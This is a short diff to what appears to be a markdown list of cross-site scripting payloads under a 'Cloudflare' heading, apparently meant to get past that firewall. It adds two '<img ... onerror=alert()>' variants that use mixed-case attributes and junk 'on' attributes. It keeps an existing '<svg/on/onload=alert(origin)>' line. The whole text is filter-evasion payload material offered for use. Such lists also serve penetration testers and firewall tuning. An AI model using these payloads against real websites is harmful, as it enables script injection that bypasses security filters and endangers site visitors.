@@ -8,7 +8,9 @@
 ## Cloudflare
 
 ```
+<img src=x on onerror=alert()>
 <svg/on/onload=alert(origin)>
+<img src=x oNlY=1 oNerror=alert('xxs')//
 ```
 
 ```
